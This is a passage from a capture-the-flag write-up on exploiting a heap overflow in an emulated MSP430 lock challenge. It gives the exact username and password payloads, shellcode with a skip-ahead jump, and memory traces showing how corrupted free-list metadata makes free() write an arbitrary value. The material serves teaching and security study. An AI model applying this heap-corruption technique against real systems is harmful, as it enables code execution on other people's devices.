            <th>Disassembly</th>
          </tr>
        </thead>
        <tbody>
          <tr>
                  <td><code>3012 0000</code></td>
                  <td><code>push #0x0</code></td>
          </tr>
          <tr>
                  <td><code>dc12 b646</code></td>
                  <td><code>call 0x46b6(r12)</code></td>
          </tr>
        </tbody>
	</table>

	<p>The latter of these opcodes calls a random address, causing execution to branch into null memory and crash.</p>

	<h3>Working Around The Problem</h3>

	<p>Compare the corrupted instructions at the beginning of the <code>unlock_door</code> function with their original opcodes.</p>

	<br>
<div id="slides">
  <section id="instructions-before-free-3">
<table>
	<caption>Initial Instructions</caption>
        <thead>
          <tr>
            <th>Opcode</th>
            <th>Disassembly</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>3012 <mark>7f00</mark></code></td>
                  <td><code>push #0x7f</code></td>
          </tr>
          <tr>
		  <td><code><mark>b012</mark> b646</code></td>
                  <td><code>call #0x46b6 &lt;INT&gt;</code></td>
          </tr>
          <tr>
		  <td><code>2153</code></td>
                  <td><code>incd sp</code></td>
          </tr>
          <tr>
		  <td><code>3041</code></td>
                  <td><code>ret</code></td>
          </tr>


        </tbody>
	</table>
  </section>
  <section id="instructions-after-free-3">
<table>
	<caption>Corrupted Instructions</caption>
        <thead>
          <tr>
            <th>Opcode</th>
            <th>Disassembly</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>3012 <mark>0000</mark></code></td>
                  <td><code>push #0x0</code></td>
          </tr>
          <tr>
		  <td><code><mark>dc12</mark> b646</code></td>
                  <td><code>call 0x46b6(r12)</code></td>
          </tr>
          <tr>
		  <td><code>2153</code></td>
                  <td><code>incd sp</code></td>
          </tr>
          <tr>
		  <td><code>3041</code></td>
                  <td><code>ret</code></td>
          </tr>
        </tbody>
	</table>
  </section>
</div>
<ul id="nav">
  <li><a href="#instructions-before-free-3">Initial Instructions</a></li>
  <li><a href="#instructions-after-free-3">Corrupted Instructions</a></li>
</ul>

<p>Notice that the corruption is only partial. Both initial instructions are two words long, and the random data only seems to overwrite the second word of the first instruction and the first word of the second instruction.</p>

<p>The <code>unlock_door</code> function begins at address <code>0x4564</code> and ends at <code>0x456e</code>. It is ten bytes long. The following debugger command reads the exact region of memory.</p>


<pre><code>read 4564 10</code></pre> 

<p>The highlighting below indicates the assembly for the uncorrupted <code>unlock_door</code> function. The first underlined word is the address, which is not part of the code.</p>

        <pre><code>&gt; read 4564 10
<u>4564</u> <mark>3012 7f00 b012 b646 2153</mark>  0......F!S</code></pre>

<p>The exploit corrupts the second and third words after the end of the free call.</p>

        <pre><code>&gt; read 4564 10
<u>4564</u> 3012 <mark>7f00 b012</mark> b646 2153  0......F!S</code></pre>

	<p>Crucially, the first word in the code is left unmolested.</p>

        <pre><code>&gt; read 4564 10
<u>4564</u> <mark>3012</mark> 7f00 b012 b646 2153  0......F!S</code></pre>

<p>While convenient, returning to the <code>unlock_door</code> function is not explicitly required. Suppose the return address is overwritten with a pointer to shellcode instead. This approach is much more flexible because—if the first word remains uncorrupted consistently—a jump instruction there can skip over the corrupted bytes and continue execution normally.</p>

<h3>Writing Shellcode</h3>

<p>The exploit thus far is as follows.</p>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa 6445 9443 2100</pre></code>

<p>First, the beginning of the new payload will need to contain executable code—ideally, the same shellcode used earlier. The username will look something like the following.</p>

<pre><code><mark>3240 00ff b012 1000</mark> aaaa aaaa aaaa aaaa 6445 9443 2100</pre></code>

<p>Change the value to write so it points to the shellcode.</p>

<pre><code>3240 00ff b012 1000 aaaa aaaa aaaa aaaa <mark>0e24</mark> 9443 2100</pre></code>

<p>If the theory is correct, this tweak will corrupt the first two words of the shellcode and cause a crash when executing it. Single stepping after the end of the <code>free</code> call confirms this.</p>

<br>
<div id="slides">
  <section id="two-word-payload-memory-before-free-4">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 <mark>3240</mark>   .$.......$.$!.2@
2410: <mark><u>00ff b012</u> 1000 aaaa aaaa aaaa aaaa 0e24</mark>   ...............$
2420: <mark>9443 2100</mark> bbbb 0000 0000 0000 0000 0000   .C!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
  <section id="two-word-payload-memory-after-free-4">
<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 <mark>3240</mark>   .$.......$.$!.2@
2410: <mark><u>0000 dc12</u> 1000 aaaa aaaa aaaa aaaa 0e24</mark>   ...............$
2420: <mark>9443 2000</mark> bbbb 0000 0000 0000 0000 0000   .C .............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#two-word-payload-memory-before-free-4">Payload Memory Before Free</a></li>
  <li><a href="#two-word-payload-memory-after-free-4">Payload Memory After Free</a></li>
</ul>

<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.</code></pre>

<p>The executable code should be shifted three words higher in memory to leave a gap for those writes.</p> 

<pre><code>aaaa aaaa aaaa <mark>3240 00ff b012 1000</mark> aaaa 0e24 9443 2100</pre></code>

<p>The random data corruption occurs here:</p>

<pre><code>aaaa <mark>aaaa aaaa</mark> 3240 00ff b012 1000 aaaa 0e24 9443 2100</pre></code>

<p>The jump instruction will be here:</p>

<pre><code><mark>aaaa</mark> aaaa aaaa 3240 00ff b012 1000 aaaa 0e24 9443 2100</pre></code>

<p>In this case, the code should jump six bytes from the first instruction.</p>

<pre><code class='language-ascii-noshadows'>  ┌───────────────────┬─────────────────────┐
┌─┤     <mark>JMP $+0x6</mark>     │ <mark>023c</mark>                │
│ ├───────────────────┼─────────────────────┤
│ │[OVERWRITTEN WORDS]│ aaaa aaaa           │
│ ├───────────────────┼─────────────────────┤
│ │                   │                     │
└►│     SHELLCODE     │ 3240 00ff b012 1000 │
  │                   │                     │
  ├───────────────────┼─────────────────────┤
  │     PADDING       │ aaaa                │
  ├───────────────────┼─────────────────────┤
  │                   │                     │
  │     METADATA      │ 0e24 9443 2100      │
  │                   │                     │
  └───────────────────┴─────────────────────┘
</code></pre>


<p>The <code>JMP $+0x6</code> opcode (<code>0x023c</code> when assembled) achieves this. The final payload is below.</p>

<h5>Username</h5>
<pre><code><mark>023c</mark> aaaa aaaa 3240 00ff b012 1000 aaaa 0e24 9443 2100</code></pre>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<p>This payload results in arbitrary code execution.</p>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7268 cycles.
</code></pre>

<h2>Weapons Testing</h2>

<p>This exploit is much more versatile because it only requires a six-byte overflow rather than a forty-four-byte one. Achieving arbitrary code execution is not enough, however. It is still unclear whether this exploit will work consistently, so the next objective is firing it at other targets to see how it behaves.</p>

<h3>Overflow In The Password Field</h3>
<p>If this technique generally works, it should make no difference whether the exploit is supplied in the username or password field because the overflow should corrupt a data structure of the same type.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ <mark>bbbb bbbb bbbb bbbb</mark> .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>241e</mark>  │  <mark>2408</mark>  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>Aside from supplying a dummy value for the username, the only change is modifying the write value to point at the new shellcode location (because the password buffer is at a slightly higher address).</p>

<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 ffff   .$.......$.$!...
2410: 0000 0000 0000 0000 0000 0000 0000 0824   ...............$
2420: 3424 2100 <mark>023c aaaa aaaa 3240 00ff b012</mark>   4$!..&lt;....2@....
2430: <mark>1000</mark> aaaa 0e24 9443 2100 0000 0000 0000   .....$.C!.......
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<h5>Username</h5>

<pre><code>ffff</pre></code>

<h5>Password</h5>

<pre><code>023c aaaa aaaa 3240 00ff b012 1000 aaaa <mark>2424</mark> 9443 2100</pre></code>

<h5>Result</h5>
<pre><code>CPUOFF flag set; program no longer running. CPU must now be reset.</code></pre>

<p>The exploit fails, and execution reaches the end of the <code>login</code> function without issue.</p>

<br>

<div id="slides">
  <section id="data-structure-analysis-1" style="height: 34em">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  <mark>2434</mark>  │  <mark>0021</mark>  │ bbbb bbbb bbbb bbbb .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>241e</mark>  │  <mark>2408</mark>  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>This behavior suggests there must be some difference between the two above structures.</p>

  </section>
  <section id="data-structure-analysis-2" style="height: 34em">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
<mark>┌──────┐</mark> │
<mark>│</mark>      <mark>│</mark> │
<mark>│</mark> ┌──┐ <mark>│</mark> │
<mark>│</mark> │  ▼ <mark>▼</mark> ▼
<mark>│</mark> │ ┌────────┬────────┬────────┬──────────────────────────┐
<mark>│</mark> └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
<mark>│</mark>   └────────┴─────┬──┴────────┴──────────────────────────┘
<mark>│</mark>      ▲           │
<mark>│</mark> ┌────┘           │
<mark>│</mark> │                │
<mark>│</mark> │    ┌───────────┘
<mark>│</mark> │    ▼
<mark>│</mark> │ ┌────────┬────────┬────────┬──────────────────────────┐
<mark>│</mark> └─┤  2408  │  2434  │  0021  │ bbbb bbbb bbbb bbbb .... │
<mark>│</mark>   └────────┴─────┬──┴────────┴──────────────────────────┘
<mark>│</mark>      ▲           │
<mark>│</mark> ┌────┘           │
<mark>│</mark> │                │
<mark>│</mark> │    ┌───────────┘
<mark>│</mark> │    ▼
<mark>│</mark> │ ┌────────┬────────┬────────┬──────────────────────────┐
<mark>│</mark> └─┤  241e  │  <mark>2408</mark>  │  1f9c  │ 0000 0000 0000 0000 .... │
<mark>│</mark>   └────────┴─────┬──┴────────┴──────────────────────────┘
<mark>│</mark>                  <mark>│</mark>
<mark>└──────────────────┘</mark>
</code></pre>

<p>The second word of the last block seems to point lower in memory.</p>

  </section>
  <section id="data-structure-analysis-3" style="height: 34em">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  <mark>2434</mark>  │  0021  │ bbbb bbbb bbbb bbbb .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           <mark>│</mark>
│ ┌────┘           <mark>│</mark>
│ │                <mark>│</mark>
│ │    <mark>┌───────────┘</mark>
│ │    <mark>▼</mark>
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The second word of the previous block points higher in memory. This difference may break the exploit for some reason.</p>

  </section>
  <section id="data-structure-analysis-4" style="height: 34em">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  <mark>0021</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>0021</mark>  │ bbbb bbbb bbbb bbbb .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>It is also worth noting that the third word of the first two data blocks is the same.</p>

  </section>
  <section id="data-structure-analysis-5" style="height: 34em">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb bbbb bbbb bbbb .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The third word of the third block is not the same as the previous ones. This second crucial difference may also affect the algorithm in a way that causes breakage.</p>

  </section>
</div>
<ul id="nav">
  <li><a href="#data-structure-analysis-1">01</a></li>
  <li><a href="#data-structure-analysis-2">02</a></li>
  <li><a href="#data-structure-analysis-3">03</a></li>
  <li><a href="#data-structure-analysis-4">04</a></li>
  <li><a href="#data-structure-analysis-5">05</a></li>
</ul>

<h3>Simulating An Overflow In The First Block</h3>

<p>The two differences observed above are both plausible reasons for the failure. The first two blocks are similar, so the exploit might also work if it were possible to overflow the beginning of the first block.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  <mark>241e</mark>  │  <mark>0021</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb bbbb bbbb bbbb .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>No vulnerability allows overwriting this data, but it is possible to simulate one by setting these values manually via debugger commands. First, trim the overflow data from the end of the payload for the password field.</p>

<h5>Username</h5>

<pre><code>ffff</code></pre>

<h5>Password</h5>

<pre><code>023c aaaa aaaa 3240 00ff b012 1000 aaaa</code></pre>

The bytes below are from the end of the password field.

<pre><code>2424 9443 2100</code></pre>

<p>Submit the username and password payloads, step until the first call to free, and then run the following debugger commands.</p>

<pre><code>let 2408 = 2424
let 240a = 4394
</code></pre>

<p>At this point, the data structure will be as follows.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2424</mark>  │  <mark>4394</mark>  │  0021  │ aaaa 0000 0000 0000 .... │
│   └─────┬──┴────────┴────────┴──────────────────────────┘
│      ▲  │
│ ┌────┘  │
│ │       │
│ │       └─────────────────────┐
│ │                             ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │       <mark>[SHELLCODE]</mark>        │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>Proceeding from this point results in arbitrary code execution.</p>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7325 cycles.
</code></pre>

<p>This proof of concept suggests that an exploit based on an overflow in the first block would work the same way as one based on an overflow in the second. The first two blocks are functionally identical, but something is different about the third. This oddity is worthy of revisitation slightly later on.</p>

<h3>Smashing Outer Stack Frames</h3>

<p>There are multiple <code>free</code> calls. This exploit overwrites the return address for the first one and calls shellcode, which is convenient because it prevents other parts of the code from breaking the exploit between the time of the arbitrary write and the return to the overwritten address. The question is whether the exploit still works when overwriting a return address in another stack frame.</p>

<p>The return address for the <code>login</code> function is at address <code>0x439a</code>.</p>

<pre><code>4380: 0000 0000 ca46 0100 ca46 0300 3e47 0000   .....F...F..&gt;G..
4390: 0a00 2424 a846 0000 0000 <mark>4044</mark> 0000 0000   ..$$.F....@D....
43a0: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>The existing exploit is modified to overwrite this value by changing the target address.</p>


<h5>Username</h5>
<pre><code>023c aaaa aaaa 3240 00ff b012 1000 aaaa 0e24 <mark>9a43</mark> 2100</pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<p>This proof of concept also results in arbitrary code execution. The technique seems temporally resilient and can redirect program flow significantly later in execution.</p>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7351 cycles.
</code></pre>

<h2>Heap Internals</h2>

<p>The exploit works reliably. That said, the goal is not to develop a working exploit against this system but to understand the basic thought process undergirding heap exploitation against <em>any</em> system. That requires understanding how the underlying algorithm works, which necessitates reading the assembly for the <code>free</code> function. The Ghidra flow control graph for <code>free</code> is as follows.</p>

<br>
      <figure>
        <img src="./images/algiers-free-flow-control.png"
          loading="eager" alt="Flow control for the free function." />
      </figure>

<p>

<p>The first question is where the arbitrary write occurs. Recall the payload format.</p>


<pre><code class='language-ascii-noshadows'>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>cccc</mark> <u>eeee</u> 2100
                                        ▲    ▲
                          ┌─────────────┘    └───┐
                          │                      │
                       ┌──┴──┐               ┌───┴───┐
		       │<mark>VALUE</mark>│ IS WRITTEN TO │<u>ADDRESS</u>│
                       └─────┘               └───────┘
</code></pre>

<p>A specific instruction in the <code>free</code> function will write the value <code>0xCCCC</code> to address <code>0xEEEE</code>. Identifying that instruction can be accomplished by providing the above test payload as a username with a short dummy value for the password, breaking at the start of the <code>free</code> function, and single-stepping while watching address <code>0xEEEE</code>.</p>

<br>
<div id="slides">
  <section id="execution-trace-1">
<pre><code class='language-ascii-noshadows'>┌────┬───────────────────────┐
│4524│ add #0x6, r12         │
├────┼───────────────────────┤
│4528│ add r13, r12          │
├────┼───────────────────────┤  ┌──┐
│452a│ mov r12, 0x4(r14)     │◄─┤PC│
├────┼───────────────────────┤  └──┘
│452e│ mov 0x2(r15), 0x2(r14)│
├────┼───────────────────────┤
│4534│ mov 0x2(r15), r13     │
├────┼───────────────────────┤
│4538│ mov r14, 0x0(r13)     │
├────┼───────────────────────┤
│453c│ mov @r15, r15         │
└────┴───────────────────────┘

┌─────────────────────────────────────────────┐
│ccc0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│ccd0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│cce0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│eee0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│eef0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="execution-trace-2">
<pre><code class='language-ascii-noshadows'>┌────┬───────────────────────┐
│4524│ add #0x6, r12         │
├────┼───────────────────────┤
│4528│ add r13, r12          │
├────┼───────────────────────┤
│452a│ mov r12, 0x4(r14)     │
├────┼───────────────────────┤  ┌──┐
│452e│ mov 0x2(r15), 0x2(r14)│◄─┤PC│
├────┼───────────────────────┤  └──┘
│4534│ mov 0x2(r15), r13     │
├────┼───────────────────────┤
│4538│ mov r14, 0x0(r13)     │
├────┼───────────────────────┤
│453c│ mov @r15, r15         │
└────┴───────────────────────┘

┌─────────────────────────────────────────────┐
│ccc0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│ccd0: <mark>2600</mark> 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│cce0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│eee0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│eef0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="execution-trace-3">
<pre><code class='language-ascii-noshadows'>┌────┬───────────────────────┐
│4524│ add #0x6, r12         │
├────┼───────────────────────┤
│4528│ add r13, r12          │
├────┼───────────────────────┤
│452a│ mov r12, 0x4(r14)     │
├────┼───────────────────────┤
│452e│ mov 0x2(r15), 0x2(r14)│
├────┼───────────────────────┤  ┌──┐
│4534│ mov 0x2(r15), r13     │◄─┤PC│
├────┼───────────────────────┤  └──┘
│4538│ mov r14, 0x0(r13)     │
├────┼───────────────────────┤
│453c│ mov @r15, r15         │
└────┴───────────────────────┘

┌─────────────────────────────────────────────┐
│ccc0: 0000 0000 0000 0000 0000 0000 0000 <mark>eeee</mark>│
├─────────────────────────────────────────────┤
│ccd0: 2600 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│cce0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│eee0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│eef0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="execution-trace-4">
<pre><code class='language-ascii-noshadows'>┌────┬───────────────────────┐
│4524│ add #0x6, r12         │
├────┼───────────────────────┤
│4528│ add r13, r12          │
├────┼───────────────────────┤
│452a│ mov r12, 0x4(r14)     │
├────┼───────────────────────┤
│452e│ mov 0x2(r15), 0x2(r14)│
├────┼───────────────────────┤
│4534│ mov 0x2(r15), r13     │
├────┼───────────────────────┤  ┌──┐
│4538│ mov r14, 0x0(r13)     │◄─┤PC│
├────┼───────────────────────┤  └──┘
│453c│ mov @r15, r15         │
└────┴───────────────────────┘

┌─────────────────────────────────────────────┐
│ccc0: 0000 0000 0000 0000 0000 0000 0000 eeee│
├─────────────────────────────────────────────┤
│ccd0: 2600 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│cce0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│eee0: 0000 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│eef0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘
</code></pre>
  </section>
  <section id="execution-trace-5">
<pre><code class='language-ascii-noshadows'>┌────┬───────────────────────┐
│4524│ add #0x6, r12         │
├────┼───────────────────────┤
│4528│ add r13, r12          │
├────┼───────────────────────┤
│452a│ mov r12, 0x4(r14)     │
├────┼───────────────────────┤
│452e│ mov 0x2(r15), 0x2(r14)│
├────┼───────────────────────┤
│4534│ mov 0x2(r15), r13     │
├────┼───────────────────────┤
│4538│ <mark>mov r14, 0x0(r13)</mark>     │
├────┼───────────────────────┤  ┌──┐
│453c│ mov @r15, r15         │◄─┤PC│
└────┴───────────────────────┘  └──┘

┌─────────────────────────────────────────────┐
│ccc0: 0000 0000 0000 0000 0000 0000 0000 eeee│
├─────────────────────────────────────────────┤
│ccd0: 2600 0000 0000 0000 0000 0000 0000 0000│
├─────────────────────────────────────────────┤
│cce0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│eee0: 0000 0000 0000 0000 0000 0000 0000 <mark>cccc</mark>│
├─────────────────────────────────────────────┤
│eef0: 0000 0000 0000 0000 0000 0000 0000 0000│
└─────────────────────────────────────────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#execution-trace-1">01</a></li>
  <li><a href="#execution-trace-2">02</a></li>
  <li><a href="#execution-trace-3">03</a></li>
  <li><a href="#execution-trace-4">04</a></li>
  <li><a href="#execution-trace-5">05</a></li>
</ul>

<p>As soon as the value <code>0xCCCC</code> appears, note down the current value of <code>PC</code>. The instruction just before that performs the write.</p>

<p>This instruction is in the following conditional block.</p>

<br>
      <figure>
        <img src="./images/algiers/algiers-arbitrary-write-instruction.png"
          loading="eager" alt="Instruction where arbitrary write occurs." />
      </figure>
      <hr>

      <p>The payloads used up to this point cause execution to reach this block, but it is unclear why. Understanding the algorithm first requires understanding how to get to this block.</p>

      <h3>Free Calling Convention</h3>
      <p>The <code>free</code> function takes only one parameter, as is discernible from the outer scope.</p>

      <pre><code>46a2:  0f4b           <mark>mov	r11, r15</mark>
46a4:  b012 0845      call	#0x4508 &lt;free&gt;
46a8:  0f4a           mov	r10, r15
46aa:  b012 0845      call	#0x4508 &lt;free&gt;
</code></pre>

<p>The <code>R15</code> register contains the value <code>0x2424</code> before the first free call, which is a pointer to the buffer containing the dummy password.</p>

<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa cccc   ................
2420: eeee 2100 <mark>bbbb</mark> 0000 0000 0000 0000 0000   ..!.............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>The second call takes a pointer to the beginning of the username buffer at address <code>0x240e</code>.</p>

      <pre><code>46a2:  0f4b           mov	r11, r15
46a4:  b012 0845      call	#0x4508 &lt;free&gt;
46a8:  0f4a           <mark>mov	r10, r15</mark>
46aa:  b012 0845      call	#0x4508 &lt;free&gt;
</code></pre>

<pre><code>2400: 0824 0010 0000 0000 0824 1e24 2100 <mark>aaaa</mark>   .$.......$.$!...
2410: aaaa aaaa aaaa aaaa aaaa aaaa aaaa cccc   ................
2420: eeee 2000 bbbb 0000 0000 0000 0000 0000   .. .............
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
